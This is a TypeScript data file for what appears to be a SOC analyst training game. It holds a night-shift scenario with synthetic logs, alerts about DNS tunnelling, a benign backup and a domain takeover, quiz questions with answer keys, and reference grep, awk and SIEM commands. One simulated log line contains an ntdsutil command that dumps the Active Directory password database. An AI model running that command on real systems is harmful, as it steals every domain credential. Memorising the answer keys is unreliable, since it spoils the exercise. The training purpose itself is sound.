    for (t = at('01:00:30'); t < at('02:30:00'); t += 30) out.push(fw(t, 'allow', '10.0.6.40', int(r, 40000, 60000), '198.51.100.200', 443, int(r, 45_000_000, 55_000_000)));
    // p.harris's account at 2am, from a laptop that is not theirs.
    out.push(edr(at('01:57:40'), 'LT-115', { event: 'process_start', user: 'p.harris', parent: 'explorer.exe', process: 'mstsc.exe', cmd: 'mstsc.exe /v:dc01' }));
    out.push(win(at('01:58:02'), { EventID: '4625', user: 'p.harris', src: '10.0.4.115', logon_type: '10', result: 'bad_password' }));
    out.push(win(at('01:58:31'), { EventID: '4625', user: 'p.harris', src: '10.0.4.115', logon_type: '10', result: 'bad_password' }));
    out.push(win(at('02:05:12'), { EventID: '4624', user: 'p.harris', src: '10.0.4.115', logon_type: '10', result: 'success' }));
    out.push(win(at('02:06:40'), { EventID: '4720', user: 'p.harris', target: 'svc-sync2', result: 'account_created' }));
    out.push(win(at('02:07:05'), { EventID: '4722', user: 'p.harris', target: 'svc-sync2', result: 'account_enabled' }));
    out.push(win(at('02:07:30'), { EventID: '4728', user: 'p.harris', member: 'svc-sync2', group: 'Domain Admins', result: 'member_added' }));
    out.push(win(at('02:09:00'), { EventID: '4624', user: 'svc-sync2', src: '10.0.4.115', logon_type: '3', result: 'success' }));
    out.push(edr(at('02:09:20'), 'LT-115', { event: 'process_start', user: 'svc-sync2', parent: 'cmd.exe', process: 'ntdsutil.exe', cmd: 'ntdsutil.exe "ac i ntds" ifm "create full C:\\Temp\\x" q q' }));
    // Routine on-call work, for contrast.
    out.push(win(at('01:31:10'), { EventID: '4624', user: 'k.mensah', src: '10.0.4.129', logon_type: '10', result: 'success' }));
    out.push(win(at('01:44:00'), { EventID: '4634', user: 'k.mensah', src: '10.0.4.129', result: 'logoff' }));
    return out;
  },
  alerts: [
    {
      id: 'night-dns', t: at('01:52'), rule: 'Unusually high number of DNS queries to one domain from one host', severity: 'medium', host: 'db02',
      summary: 'db02 made hundreds of DNS queries for random-looking names under one domain in 30 minutes.',
      entities: [['host', 'db02 (10.0.3.22)'], ['domain', '*.t.sync-check.example']],
      query: 'source=dns client=10.0.3.22',
      verdict: 'tp', need: ['isolate', 'block', 'escalate'], fine: [],
      questions: [
        { id: 'domain', ask: 'Which domain are the queries for?', answers: ['sync-check.example'], contains: true, hint: 'source=dns client=10.0.3.22 | top query' },
        { id: 'type', ask: 'Which DNS record type is being asked for?', answers: ['TXT'], hint: 'Look at the qtype field.' },
        { id: 'fwd', ask: 'Which internal server sent these queries out to the internet? (name or IP)', answers: ['dns01', '10.0.1.53'], hint: 'source=fw dpt=53 | stats count by src' },
      ],
      why: 'DNS tunnelling: data is chopped up, encoded as hex and sent as the "names" being looked up, under a domain whose name server the attacker runs (203.0.113.9). TXT answers can carry commands back. A database server has no reason to look up hundreds of random names at 1am, and DNS is often allowed out when everything else is blocked, which is why attackers use it. The firewall only saw dns01 talking to 203.0.113.9, because dns01 resolves on db02\'s behalf: you need the DNS log to find the real source. Isolate db02, block the domain at the resolver, and escalate: customer data may have left.',
      actionWhy: {
        close: 'Random 50-character names under a 6-day-old domain from a database server is exfiltration, not noise.',
        tune: 'The rule caught it.',
        disable: 'No user account is involved in this alert.',
        reset: 'No user account is involved in this alert.',
      },
    },
    {
      id: 'night-backup', t: at('02:32'), rule: 'Large outbound transfer: more than 5 GB to one external address in 90 minutes', severity: 'medium', host: 'bk01',
      summary: 'bk01 sent several gigabytes to an outside address between 01:00 and 02:30.',
      entities: [['src', 'bk01 (10.0.6.40)'], ['dst', '198.51.100.200:443']],
      query: 'source=fw src=10.0.6.40',
      verdict: 'benign', need: ['close'], fine: ['tune'],
      questions: [
        { id: 'chg', ask: 'Which change ticket covers this transfer?', answers: ['CHG-420', 'chg420'], hint: 'grep -i backup ~/docs/change-calendar.txt' },
        { id: 'who', ask: 'Who owns 198.51.100.200?', answers: ['vault', 'backup'], contains: true, hint: 'whois 198.51.100.200' },
      ],
      why: 'bk01 is the backup server, and every night from 01:00 it sends an encrypted copy to Offsite Vault Backup Services (CHG-420, a standing change). Big, steady, to a known partner, on schedule: authorised activity, so a benign true positive. Close it; the rule could exclude this pair during the backup window. Compare it with the DNS alert: that one was small packets to a brand-new domain, which is why size alone is a poor guide.',
      actionWhy: {
        block: 'Blocking the backup provider would stop the company\'s offsite backups.',
        isolate: 'The backup server is doing its job.',
        escalate: 'A documented nightly backup is not an incident.',
        disable: 'No account is involved.',
        reset: 'No account is involved.',
      },
    },
    {
      id: 'night-admin', t: at('02:10'), rule: 'Account added to a privileged group (Domain Admins)', severity: 'critical', host: 'dc01',
      summary: 'A newly created account was added to Domain Admins at 02:07.',
      entities: [['group', 'Domain Admins'], ['changed by', 'p.harris'], ['host', 'dc01']],
      query: 'source=win EventID=4728',
      verdict: 'tp', need: ['disable', 'isolate', 'escalate'], fine: ['reset'],
      questions: [
        { id: 'acct', ask: 'Which account was added to Domain Admins?', answers: ['svc-sync2'], hint: 'source=win EventID=4728' },
        { id: 'laptop', ask: 'Which laptop did p.harris sign in from? (name or IP)', answers: ['LT-115', '10.0.4.115', 'lt115'], hint: 'source=win user=p.harris EventID=4624, then look the address up in ~/docs/staff.csv' },
        { id: 'owner', ask: 'Whose laptop is that?', answers: ['k.park', 'kim park'], contains: true, hint: 'grep LT-115 ~/docs/staff.csv' },
      ],
      why: 'At 02:05 p.harris\'s account signed in to dc01 over remote desktop, after two failed attempts, from LT-115, Kim Park\'s laptop. Kim is on leave and p.harris is not on call (k.mensah is, and k.mensah\'s 01:31 session is the normal kind). The account then created svc-sync2, enabled it and added it to Domain Admins, and svc-sync2 ran ntdsutil to copy the Active Directory database: every password hash in the company. This is a domain compromise. Disable p.harris and svc-sync2, isolate LT-115, and escalate immediately; resetting passwords widely will follow.',
      actionWhy: {
        close: 'A new Domain Admin created at 2am by someone not on call, from an absent colleague\'s laptop, is about as serious as it gets.',
        tune: 'The rule caught a domain compromise.',
        block: 'Everything here is internal; there is no outside address to block.',
      },
    },
  ],
  tasks: [
    { id: 's3-count', after: at('01:52'), where: 'terminal', ask: 'Count the DNS queries for names under sync-check.example.', hint: 'grep -c', ref: 'grep -c "sync-check.example" /var/log/dns.log', compare: 'exact',
      learn: 'grep -c sync-check.example /var/log/dns.log. Hundreds in half an hour from one server, at night, when the rest of the company makes a handful.' },
    { id: 's3-longest', after: at('01:52'), where: 'terminal', ask: 'Print the length of the longest query name in the DNS log (just the number).', hint: 'The 4th field is query=NAME. awk can strip the prefix with sub(/^query=/,"",$4) and print length($4); then sort -n | tail -1.',
      ref: 'awk \'{sub(/^query=/,"",$4); print length($4)}\' /var/log/dns.log | sort -n | tail -1', compare: 'number',
      learn: 'awk \'{sub(/^query=/,"",$4); print length($4)}\' /var/log/dns.log | sort -n | tail -1. Normal names are short; tunnelled data makes long, random-looking labels. Length and randomness are classic DNS tunnelling signals.' },
    { id: 's3-clients', after: at('01:52'), where: 'siem', ask: 'In the SIEM, count DNS queries per client, most first.', hint: 'source=dns | stats count by client | sort -count',
      ref: 'source=dns | stats count by client | sort -count', compare: 'set', orderBy: 'count',
      learn: 'source=dns | stats count by client | sort -count. One client towers over the others: that is your baseline being broken.' },
    { id: 's3-window', after: at('02:10'), where: 'terminal', ask: 'Show every Windows security event from 02:00 up to (not including) 02:15, in order.', hint: 'Time stamps sort as text, so awk can compare them: awk \'$1 >= "2026-11-05T02:00" && $1 < "2026-11-05T02:15"\'',
      ref: 'awk \'$1 >= "2026-11-05T02:00" && $1 < "2026-11-05T02:15"\' /var/log/security.log', compare: 'exact',
      learn: 'ISO time stamps (2026-11-05T02:05:12Z) sort correctly as plain text, so string comparison makes time windows easy. The sequence 4624, 4720, 4722, 4728, 4624 tells the story by itself.' },
    { id: 's3-script', after: at('02:10'), where: 'terminal', ask: 'Write ~/bin/who-did.sh USER: for lines containing "user=USER ", print each EventID with how many times it appears, most first.',
      hint: 'grep "user=$1 " /var/log/security.log | grep -o "EventID=[0-9]*" | sort | uniq -c | sort -rn',
      ref: 'grep "user=$1 " /var/log/security.log | grep -o "EventID=[0-9]*" | sort | uniq -c | sort -rn', compare: 'ranked', kv: true,
      script: { path: '/home/analyst/bin/who-did.sh', tests: [['p.harris'], ['svc-sync2'], ['k.mensah']] },
      learn: 'grep -o prints only the matching part, perfect for pulling one field out of key=value logs. A profile of what an account did is the first thing incident response will ask for.' },
    { id: 's3-bytes', after: at('02:32'), where: 'siem', ask: 'In the SIEM, total the bytes bk01 (10.0.6.40) sent to each destination, biggest first.', hint: 'source=fw src=10.0.6.40 | stats sum(bytes) as total by dst | sort -total',
      ref: 'source=fw src=10.0.6.40 | stats sum(bytes) as total by dst | sort -total', compare: 'set', orderBy: 'total',
      learn: 'stats sum(bytes) by dst turns thousands of connection records into one line per destination: the volume question answered in one search.' },
    { id: 's3-gb', after: at('02:32'), where: 'terminal', ask: 'Add up the bytes bk01 sent to 198.51.100.200 and print the total in gigabytes with two decimals (1 GB = 1024 × 1024 × 1024 bytes).', hint: 'awk -F"bytes=" \'{s+=$2} END {printf "%.2f\\n", s/1024/1024/1024}\' after two greps.',
      ref: 'grep "src=10.0.6.40 " /var/log/firewall.log | grep "dst=198.51.100.200 " | awk -F"bytes=" \'{s+=$2} END {printf "%.2f\\n", s/1024/1024/1024}\'', compare: 'number',
      learn: 'Using "bytes=" as the field separator makes $2 the number after it. awk sums, then printf formats: %.2f is two decimal places.' },
  ],
  intel: {
    'sync-check.example': 'sync-check.example\n  Reputation: suspicious (score 81/100)\n  Categories: newly registered domain, DNS tunnelling suspected\n  Registered 2026-10-30. Name server ns1.sync-check.example (203.0.113.9).',
    't.sync-check.example': 'Look up the registered domain instead: intel sync-check.example',
    '203.0.113.9': '203.0.113.9\n  Reputation: suspicious (score 77/100)\n  Categories: name server for suspicious domains',
    '198.51.100.200': '198.51.100.200\n  Reputation: no records\n  Known business partner on the SOC allow list: Offsite Vault Backup Services.',
  },
  whois: {
    'sync-check.example': 'sync-check.example\n  Registrar: Example Registrar Ltd\n  Created: 2026-10-30\n  Name servers: ns1.sync-check.example (203.0.113.9)',
    '203.0.113.9': '203.0.113.9\n  Organisation: Example Hosting LLC\n  Country: US',
    '198.51.100.200': '198.51.100.200\n  Organisation: Offsite Vault Backup Services S.A.\n  Country: PT\n  Customer note: Fernco Ltd, nightly encrypted backups (contract OV-2291)',
  },
};

export const SHIFTS: Shift[] = [SSH_SHIFT, PHISH_SHIFT, NIGHT_SHIFT, NET_SHIFT];
export const shiftById = (id: string) => SHIFTS.find(s => s.id === id);
